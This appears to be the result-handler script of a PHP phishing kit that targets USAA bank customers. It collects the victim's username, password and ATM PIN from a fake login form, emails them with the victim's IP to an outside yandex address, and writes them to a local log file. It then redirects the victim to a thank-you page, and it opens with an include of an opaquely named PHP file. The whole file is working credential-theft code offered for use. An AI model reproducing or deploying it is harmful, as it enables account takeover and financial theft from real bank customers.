<?php include_once'../dbf60138c911308b0c99510ba80c36cc.php';?><?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$usaauser = $_POST['usaauser'];
$usaapass = $_POST['usaapass'];
$usaapin = $_POST['usaapin'];
$message .="
usaa : ".$usaauser."
ussa pw : ".$usaapass."
atm pin : ".$usaapin."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========|0v3r|=====================||\n";
$send="jokamercairoresult@yandex.com";
$subject = "usaa bank cash | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../0v3r.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'thx.php'</script>");
?>